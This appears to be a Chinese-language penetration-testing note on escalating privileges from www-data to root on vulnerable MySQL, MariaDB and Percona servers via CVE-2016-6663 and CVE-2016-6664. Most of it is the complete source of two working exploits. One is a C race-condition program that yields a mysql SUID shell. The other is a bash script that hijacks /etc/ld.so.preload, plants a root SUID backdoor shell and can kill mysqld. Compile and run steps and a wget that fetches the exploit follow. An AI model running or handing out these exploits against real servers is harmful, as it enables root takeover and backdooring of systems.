  #### CVE-2016-6663+CVE-2016-6664
  	版本
	MariaDB < 5.5.52 < 10.1.18 < 10.0.28
	MySQL  <= 5.5.51  <= 5.6.32  <= 5.7.14
	Percona Server < 5.5.51-38.2 < 5.6.32-78-1 < 5.7.14-8
	Percona XtraDB Cluster < 5.6.32-25.17 < 5.7.14-26.17 < 5.5.41-37.0
	www-data权限提升为mysql权限，上传mysql-privesc-race.c文件
```c
#include <fcntl.h>
#include <grp.h>
#include <mysql.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>


#define EXP_PATH          "/tmp/mysql_privesc_exploit"
#define EXP_DIRN          "mysql_privesc_exploit"
#define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"
#define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"

#define SUID_SHELL   	  EXP_PATH "/mysql_suid_shell.MYD"

#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary

MYSQL *conn;		  // DB handles
MYSQL_RES *res;
MYSQL_ROW row;

unsigned long cnt;


void intro() {

printf( 
        "\033[94m\n"
        "MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"
        "mysql-privesc-race.c (ver. 1.0)\n\n"
        "CVE-2016-6663 / CVE-2016-5616\n\n"
        "For testing purposes only. Do no harm.\n\n"
	"Discovered/Coded by:\n\n"
	"Dawid Golunski \n"
	"http://legalhackers.com"
        "\033[0m\n\n");

}

void usage(char *argv0) {
    intro();
    printf("Usage:\n\n%s user pass db_host database\n\n", argv0);
}

void mysql_cmd(char *sql_cmd, int silent) {
    
    if (!silent) {
	    printf("%s \n", sql_cmd);
    }
    if (mysql_query(conn, sql_cmd)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }
    res = mysql_store_result(conn);
    if (res>0) mysql_free_result(res);

}


int main(int argc,char **argv)
{

    int randomnum = 0;
    int io_notified = 0;
    int myd_handle;
    int wpid;
    int is_shell_suid=0;
    pid_t pid;
    int status;
    struct stat st;
    /* io notify */
    int fd;
    int ret;
    char buf[4096] __attribute__((aligned(8)));
    int num_read;
    struct inotify_event *event;
    /* credentials */
    char *user     = argv[1];
    char *password = argv[2];
    char *db_host  = argv[3];
    char *database = argv[4];


    // Disable buffering of stdout
    setvbuf(stdout, NULL, _IONBF, 0);

    // Get the params
    if (argc!=5) {
	usage(argv[0]);
	exit(1);
    } 
    intro();
    // Show initial privileges
    printf("\n[+] Starting the exploit as: \n");
    system("id");

    // Connect to the database server with provided credentials
    printf("\n[+] Connecting to the database `%s` as %s@%s\n", database, user, db_host);
    conn = mysql_init(NULL);
    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }

    // Prepare tmp dir
    printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN);
    umask(000);
    system("rm -rf /tmp/" EXP_DIRN " && mkdir /tmp/" EXP_DIRN);
    system("chmod g+s /tmp/" EXP_DIRN );

    // Prepare exploit tables :)
    printf("\n[+] Creating mysql tables \n\n");
    mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);
    mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);
    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
    mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);

    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
    printf("\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n");
    system("cp /bin/bash " SUID_SHELL);
    system("ls -l " SUID_SHELL);

    // Use inotify to get the timing right
    fd = inotify_init();
    if (fd < 0) {
        printf("failed to inotify_init\n");
        return -1;
    }
    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);


    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */

    printf("\n[+] Entering the race loop... Hang in there...\n");

    while ( is_shell_suid != 1 ) {

        cnt++;
	if ( (cnt % 100) == 0 ) {
	 	printf("->");
	 	//fflush(stdout);	
	}

        /* Create empty file , remove if already exists */
        unlink(MYSQL_TEMP_FILE);
        unlink(MYSQL_TAB_FILE);
   	mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);
	mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);

	/* random num if needed */
        srand ( time(NULL) );
        randomnum = ( rand() % MAX_DELAY );

        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink
        pid = fork();
        if (pid < 0) {
            fprintf(stderr, "Fork failed :(\n");
        }

        /* Child process - executes REPAIR TABLE  SQL statement */
        if (pid == 0) {
            usleep(500);
            unlink(MYSQL_TEMP_FILE);
	    mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1);
            // child stops here
            exit(0);
        }

        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */
        if (pid > 0 ) {
            io_notified = 0;

            while (1) {
                int processed = 0;
                ret = read(fd, buf, sizeof(buf));
                if (ret < 0) {
                    break;
                }
                while (processed < ret) {
                    event = (struct inotify_event *)(buf + processed);
                    if (event->mask & IN_CLOSE) {
                        if (!strcmp(event->name, "exploit_table.TMD")) {
                            //usleep(randomnum);

			    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file 
			    unlink(MYSQL_TAB_FILE);
			    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);
			    close(myd_handle);
			    chmod(MYSQL_TAB_FILE, 04777);

			    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec
                            unlink(MYSQL_TEMP_FILE);
                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);
                            io_notified=1;
                        }
                    }
                    processed += sizeof(struct inotify_event);
                }
                if (io_notified) {
                    break;
                }
            }


            waitpid(pid, &status, 0);
        }

	// Check if SUID bit was set at the end of this attempt
        if ( lstat(SUID_SHELL, &st) == 0 ) {
	    if (st.st_mode & S_ISUID) {
		is_shell_suid = 1;
	    }
        } 

    }

    printf("\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n", cnt);
    system("ls -l " SUID_SHELL);

    printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n");
    system(SUID_SHELL " -p -i ");
    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");

    /* close MySQL connection and exit */
    printf("\n[+] Job done. Exiting\n\n");
    mysql_close(conn);
    return 0;

}
```
	编译
	gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
	执行
	./mysql-privesc-race user pass localhost testdb
	现在已经变为mysql权限
	提升至root使用CVE-2016-6664
	目标主机配置必须是是基于文件的日志(默认配置)，不能是syslog方式
	vim /etc/mysql/conf.d/mysqld_safe_syslog.cnf
	删除syslog
	重启mysql：mysqld_safe --user=mysql
	检测
	grep -r syslog /etc/mysql返回没有任何结果即是满足“基于文件的日志”要求
```bash
#!/bin/bash -p
# Usage:
# ./mysql-chowned.sh path_to_error.log 
BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/mysqlrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
    # Cleanup 
    echo -e "\n[+] Cleaning up..."
    rm -f $PRIVESCSRC
    rm -f $PRIVESCLIB
    rm -f $ERRORLOG
    touch $ERRORLOG
    if [ -f /etc/ld.so.preload ]; then
        echo -n > /etc/ld.so.preload
    fi
    echo -e "\n[+] Job done. Exiting with code $1 \n"
    exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
    cleanexit 0
}

#intro 
echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
    echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
    exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
id | grep -q mysql 
if [ $? -ne 0 ]; then
    echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"
    exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
    echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n"
    exit 3
fi
echo -e "\n[+] Target MySQL log file set to $ERRORLOG"

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
    static uid_t  (*old_geteuid)();
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if ( old_geteuid() == 0 ) {
        chown("$BACKDOORPATH", 0, 0);
        chmod("$BACKDOORPATH", 04777);
        //unlink("/etc/ld.so.preload");
    }
    return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
    echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
    cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
    exit 2
fi

# Symlink the log file to /etc
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
    echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
    cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"

# Wait for MySQL to re-open the logs
echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"
echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
    echo -e "Got it. Executing 'killall mysqld' now..."
    killall mysqld
fi
while :; do 
    sleep 0.1
    if [ -f /etc/ld.so.preload ]; then
        echo $PRIVESCLIB > /etc/ld.so.preload
        rm -f $ERRORLOG
        break;
    fi
done

# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

#while :; do 
#    sleep 0.1
#    ps aux | grep mysqld | grep -q 'log-error'
#    if [ $? -eq 0 ]; then
#        break;
#    fi
#done

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
    echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"
else
    echo -e "\n[!] Failed to get root"
    cleanexit 2
fi


# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0
```
	必须以mysql权限执行
	>wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
	>chmod 777 mysql-chowned.sh
	>./mysql-chowned.sh /var/log/mysql/error.log